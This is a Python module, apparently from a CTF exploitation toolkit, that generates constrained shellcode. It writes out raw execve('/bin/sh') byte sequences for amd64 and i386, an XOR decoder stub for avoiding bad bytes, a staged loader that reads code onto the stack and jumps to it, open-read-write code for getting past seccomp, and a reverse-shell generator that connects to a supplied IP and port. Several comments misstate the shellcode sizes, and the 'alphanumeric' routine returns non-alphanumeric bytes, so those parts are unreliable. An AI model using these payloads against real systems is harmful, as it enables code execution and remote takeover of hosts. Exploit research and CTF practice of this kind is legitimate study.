"""
Constrained shellcode generation.

Handles:
- Alphanumeric shellcode
- Printable ASCII only
- Limited byte set (e.g., only 7 unique bytes)
- Size constraints
- Bad character avoidance
- Architecture-specific tricks
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple
import string

from supwngo.utils.helpers import p64, p32
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class ShellcodeConstraints:
    """Constraints for shellcode generation."""
    max_size: int = 0           # 0 = unlimited
    bad_bytes: Set[int] = field(default_factory=set)
    allowed_bytes: Optional[Set[int]] = None  # None = all except bad
    max_unique_bytes: int = 0   # 0 = unlimited (e.g., 7 for shellcodeme)
    must_be_alphanumeric: bool = False
    must_be_printable: bool = False
    no_nulls: bool = True
    no_newlines: bool = True
    arch: str = "amd64"


@dataclass
class GeneratedShellcode:
    """Generated shellcode result."""
    shellcode: bytes = b""
    size: int = 0
    unique_bytes: int = 0
    technique: str = ""
    notes: str = ""


class ConstrainedShellcodeGenerator:
    """
    Generate shellcode under various constraints.

    Techniques:
    - Alphanumeric encoding
    - Self-modifying shellcode
    - XOR-based decoders
    - Minimal byte set exploitation
    """

    # Alphanumeric characters
    ALPHANUMERIC = set(
        string.ascii_letters.encode() + string.digits.encode()
    )

    # Printable ASCII
    PRINTABLE = set(range(0x20, 0x7f))

    def __init__(self, constraints: Optional[ShellcodeConstraints] = None):
        """
        Initialize generator.

        Args:
            constraints: Shellcode constraints
        """
        self.constraints = constraints or ShellcodeConstraints()

        # Build allowed byte set
        if self.constraints.allowed_bytes:
            self.allowed = self.constraints.allowed_bytes
        else:
            self.allowed = set(range(256))

        # Apply constraints
        if self.constraints.must_be_alphanumeric:
            self.allowed &= self.ALPHANUMERIC
        if self.constraints.must_be_printable:
            self.allowed &= self.PRINTABLE
        if self.constraints.no_nulls:
            self.allowed.discard(0)
        if self.constraints.no_newlines:
            self.allowed.discard(0x0a)
            self.allowed.discard(0x0d)

        self.allowed -= self.constraints.bad_bytes

    def generate_execve(self) -> GeneratedShellcode:
        """
        Generate execve("/bin/sh") shellcode.

        Returns:
            GeneratedShellcode with best fitting shellcode
        """
        result = GeneratedShellcode()

        # Try various techniques based on constraints
        if self.constraints.must_be_alphanumeric:
            return self._alphanumeric_execve()

        if self.constraints.max_unique_bytes > 0:
            return self._minimal_unique_execve()

        if self.constraints.max_size and self.constraints.max_size < 30:
            return self._tiny_execve()

        # Standard shellcode with bad byte avoidance
        return self._standard_execve()

    def _standard_execve(self) -> GeneratedShellcode:
        """Generate standard execve shellcode with bad byte avoidance."""
        result = GeneratedShellcode(technique="standard")

        # x86_64 execve("/bin/sh", NULL, NULL)
        if self.constraints.arch == "amd64":
            # Standard 27-byte shellcode
            shellcode = bytes([
                0x48, 0x31, 0xf6,                    # xor rsi, rsi
                0x56,                                # push rsi
                0x48, 0xbf,                          # movabs rdi, ...
                0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,  # "/bin//sh"
                0x57,                                # push rdi
                0x54,                                # push rsp
                0x5f,                                # pop rdi
                0x48, 0x31, 0xd2,                    # xor rdx, rdx
                0xb0, 0x3b,                          # mov al, 59
                0x0f, 0x05,                          # syscall
            ])

            # Check for bad bytes and try alternatives
            if not self._check_bytes(shellcode):
                shellcode = self._encode_shellcode(shellcode)

            result.shellcode = shellcode
            result.size = len(shellcode)
            result.unique_bytes = len(set(shellcode))

        elif self.constraints.arch == "i386":
            # 32-bit execve
            shellcode = bytes([
                0x31, 0xc0,              # xor eax, eax
                0x50,                    # push eax
                0x68, 0x2f, 0x2f, 0x73, 0x68,  # push "//sh"
                0x68, 0x2f, 0x62, 0x69, 0x6e,  # push "/bin"
                0x89, 0xe3,              # mov ebx, esp
                0x50,                    # push eax
                0x53,                    # push ebx
                0x89, 0xe1,              # mov ecx, esp
                0x31, 0xd2,              # xor edx, edx
                0xb0, 0x0b,              # mov al, 11
                0xcd, 0x80,              # int 0x80
            ])

            result.shellcode = shellcode
            result.size = len(shellcode)
            result.unique_bytes = len(set(shellcode))

        return result

    def _tiny_execve(self) -> GeneratedShellcode:
        """Generate minimal size execve shellcode."""
        result = GeneratedShellcode(technique="tiny")

        if self.constraints.arch == "amd64":
            # 22-byte execve (assumes /bin/sh string exists)
            # For even smaller, need to find /bin/sh in memory
            shellcode = bytes([
                0x48, 0x31, 0xd2,              # xor rdx, rdx
                0x48, 0x31, 0xf6,              # xor rsi, rsi
                0x48, 0xbb,                    # movabs rbx, ...
                0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,  # "/bin/sh\0"
                0x53,                          # push rbx
                0x48, 0x89, 0xe7,              # mov rdi, rsp
                0xb0, 0x3b,                    # mov al, 59
                0x0f, 0x05,                    # syscall
            ])

            result.shellcode = shellcode
            result.size = len(shellcode)
            result.notes = "22-byte execve"

        return result

    def _alphanumeric_execve(self) -> GeneratedShellcode:
        """Generate alphanumeric shellcode."""
        result = GeneratedShellcode(technique="alphanumeric")

        # Alphanumeric shellcode is significantly larger
        # Uses techniques like:
        # - XOR with alphanumeric values
        # - Self-modifying code
        # - Register manipulation tricks

        # This is a stub - real alphanumeric shellcode generation is complex
        try:
            from pwn import shellcraft, asm, context
            context.arch = self.constraints.arch

            # Try pwntools alphanumeric encoder
            sc = shellcraft.sh()
            shellcode = asm(sc)

            # Encode to alphanumeric (if available)
            # This would use something like msfvenom's alpha encoder
            result.notes = "Alphanumeric encoding requires external encoder"
            result.shellcode = shellcode  # Not actually alphanumeric

        except ImportError:
            result.notes = "pwntools not available for alphanumeric shellcode"

        return result

    def _minimal_unique_execve(self) -> GeneratedShellcode:
        """
        Generate shellcode with minimal unique bytes.

        Based on techniques from "shellcodeme" CTF challenges.
        """
        result = GeneratedShellcode(technique="minimal_unique")
        max_unique = self.constraints.max_unique_bytes

        if max_unique == 7 and self.constraints.arch == "amd64":
            # The classic 7-unique-byte shellcode trick
            # Uses: pop, dec, push, inc rsp, and few others
            # Creates shellcode by building it on stack

            result.notes = f"""
7-Unique-Byte Technique:
1. Use limited instruction set (pop, dec, push, inc)
2. Build actual shellcode bytes by decrementing/incrementing
3. Push constructed values to stack
4. Modify stack pointer to execute

Example bytes: 58 48 35 XX XX XX XX 50 (pop rax; dec; xor; push)

This requires careful instruction selection and may need
binary-specific stack layout analysis.
"""
            # Actual implementation would need to:
            # 1. Find 7 bytes that can construct all needed values
            # 2. Build decoder stub
            # 3. Encode actual shellcode

        result.unique_bytes = max_unique

        return result

    def _encode_shellcode(self, shellcode: bytes) -> bytes:
        """
        Encode shellcode to avoid bad bytes.

        Args:
            shellcode: Original shellcode

        Returns:
            Encoded shellcode with decoder stub
        """
        # Find XOR key that avoids bad bytes
        key = self._find_xor_key(shellcode)

        if key is None:
            logger.warning("Could not find suitable XOR key")
            return shellcode

        # XOR encode
        encoded = bytes(b ^ key for b in shellcode)

        # Build decoder stub
        if self.constraints.arch == "amd64":
            # Simple XOR decoder
            # jmp short get_addr
            # decoder:
            #   pop rsi
            #   xor rcx, rcx
            #   mov cl, len
            # loop:
            #   xor byte [rsi], key
            #   inc rsi
            #   loop loop
            #   jmp rsi  # Jump to decoded shellcode

            decoder = bytes([
                0xeb, 0x0d,                          # jmp short +13
                0x5e,                                # pop rsi
                0x48, 0x31, 0xc9,                    # xor rcx, rcx
                0xb1, len(shellcode),                # mov cl, len
                0x80, 0x36, key,                     # xor byte [rsi], key
                0x48, 0xff, 0xc6,                    # inc rsi
                0xe2, 0xf8,                          # loop -8
                0xff, 0xe6,                          # jmp rsi
                0xe8, 0xee, 0xff, 0xff, 0xff,        # call decoder
            ])

            return decoder + encoded

        return shellcode

    def _find_xor_key(self, shellcode: bytes) -> Optional[int]:
        """Find XOR key that produces only allowed bytes."""
        for key in range(1, 256):
            if key not in self.allowed:
                continue

            encoded = bytes(b ^ key for b in shellcode)
            if self._check_bytes(encoded):
                return key

        return None

    def _check_bytes(self, data: bytes) -> bool:
        """Check if all bytes are allowed."""
        return all(b in self.allowed for b in data)

    def generate_orw(
        self,
        filename: bytes = b"flag.txt",
    ) -> GeneratedShellcode:
        """
        Generate Open-Read-Write shellcode for seccomp bypass.

        Args:
            filename: File to read

        Returns:
            ORW shellcode
        """
        result = GeneratedShellcode(technique="orw")

        try:
            from pwn import shellcraft, asm, context
            context.arch = self.constraints.arch

            sc = shellcraft.open(filename)
            sc += shellcraft.read('rax', 'rsp', 0x100)
            sc += shellcraft.write(1, 'rsp', 0x100)

            shellcode = asm(sc)

            if self._check_bytes(shellcode):
                result.shellcode = shellcode
            else:
                result.shellcode = self._encode_shellcode(shellcode)

            result.size = len(result.shellcode)
            result.unique_bytes = len(set(result.shellcode))

        except ImportError:
            result.notes = "pwntools required for ORW shellcode"

        return result

    def generate_reverse_shell(
        self,
        ip: str,
        port: int,
    ) -> GeneratedShellcode:
        """
        Generate reverse shell shellcode.

        Args:
            ip: IP address to connect to
            port: Port number

        Returns:
            Reverse shell shellcode
        """
        result = GeneratedShellcode(technique="reverse_shell")

        try:
            from pwn import shellcraft, asm, context
            context.arch = self.constraints.arch

            sc = shellcraft.connect(ip, port)
            sc += shellcraft.dupsh()

            shellcode = asm(sc)

            if self._check_bytes(shellcode):
                result.shellcode = shellcode
            else:
                result.shellcode = self._encode_shellcode(shellcode)

            result.size = len(result.shellcode)

        except ImportError:
            result.notes = "pwntools required for reverse shell"

        return result

    def generate_staged(
        self,
        stage1_size: int,
        read_fd: int = 0,
    ) -> Tuple[GeneratedShellcode, str]:
        """
        Generate staged shellcode (small loader + larger payload).

        Args:
            stage1_size: Maximum size for stage 1
            read_fd: File descriptor to read stage 2 from

        Returns:
            Tuple of (stage1 shellcode, stage2 usage instructions)
        """
        result = GeneratedShellcode(technique="staged")

        if self.constraints.arch == "amd64":
            # Stage 1: Read more shellcode and jump to it
            # read(fd, rsp, 0x1000); jmp rsp

            stage1 = bytes([
                0x48, 0x31, 0xc0,              # xor rax, rax (read syscall)
                0x48, 0x31, 0xff,              # xor rdi, rdi (fd = 0)
                0x48, 0x89, 0xe6,              # mov rsi, rsp (buffer = stack)
                0x48, 0xc7, 0xc2,              # mov rdx, 0x1000
                0x00, 0x10, 0x00, 0x00,
                0x0f, 0x05,                    # syscall
                0xff, 0xe4,                    # jmp rsp
            ])

            if read_fd != 0:
                # Adjust fd
                stage1 = bytes([
                    0x48, 0x31, 0xc0,
                    0x48, 0xc7, 0xc7,
                    read_fd & 0xff, (read_fd >> 8) & 0xff, 0, 0,
                ]) + stage1[6:]

            result.shellcode = stage1
            result.size = len(stage1)

        instructions = f"""
Stage 2 Usage:
1. Send stage 1 ({result.size} bytes) in initial exploit
2. Stage 1 reads from fd {read_fd} into stack
3. Send stage 2 (larger shellcode) - up to 0x1000 bytes
4. Stage 1 jumps to stage 2

Example:
  p.send(stage1)
  time.sleep(0.1)
  p.send(execve_shellcode)  # Any shellcode up to 4KB
"""

        return result, instructions


def analyze_byte_constraints(
    input_data: bytes,
) -> Dict[str, Any]:
    """
    Analyze what byte constraints a filter might have.

    Args:
        input_data: Sample input that passes the filter

    Returns:
        Analysis of likely constraints
    """
    result = {
        "total_bytes": len(input_data),
        "unique_bytes": len(set(input_data)),
        "has_nulls": 0 in input_data,
        "has_newlines": 0x0a in input_data or 0x0d in input_data,
        "is_printable": all(0x20 <= b < 0x7f for b in input_data),
        "is_alphanumeric": all(
            chr(b).isalnum() for b in input_data
        ),
        "byte_set": set(input_data),
    }

    return result


def suggest_shellcode_technique(
    constraints: ShellcodeConstraints,
) -> str:
    """
    Suggest best shellcode technique for given constraints.

    Args:
        constraints: Shellcode constraints

    Returns:
        Technique recommendation
    """
    recommendations = []

    if constraints.max_unique_bytes > 0 and constraints.max_unique_bytes <= 10:
        recommendations.append(
            f"Use minimal-unique-byte technique ({constraints.max_unique_bytes} bytes allowed)"
        )

    if constraints.must_be_alphanumeric:
        recommendations.append("Use alphanumeric encoder (msfvenom -e x64/alpha_mixed)")

    if constraints.must_be_printable:
        recommendations.append("Use printable encoder or staged approach")

    if constraints.max_size and constraints.max_size < 50:
        recommendations.append(f"Use tiny shellcode or staged (max {constraints.max_size} bytes)")

    if constraints.bad_bytes:
        bad = ', '.join(f'0x{b:02x}' for b in list(constraints.bad_bytes)[:5])
        recommendations.append(f"Avoid bad bytes: {bad}... (use XOR encoder)")

    if not recommendations:
        recommendations.append("Standard shellcode should work")

    return "\n".join(f"- {r}" for r in recommendations)
